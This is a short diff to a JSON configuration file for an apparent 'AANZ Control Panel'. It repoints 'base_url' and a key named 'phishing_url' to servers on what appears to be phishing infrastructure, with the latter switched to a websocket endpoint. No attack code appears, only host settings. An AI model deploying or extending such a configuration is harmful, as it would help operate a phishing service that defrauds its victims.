@@ -1,6 +1,6 @@
 {
-  "base_url": "http://server-panel-2.jhonaleystore.id:2864",
-  "phishing_url": "http://senzhitambanget.bangsaa.web.id:2013",
+  "base_url": "http://senzhitambanget.bangsaa.web.id:2012",
+  "phishing_url": "ws://senzhitambanget.bangsaa.web.id:2013",
   "version": "1.0.0",
   "app_name": "AANZ Control Panel",
   "endpoints": {
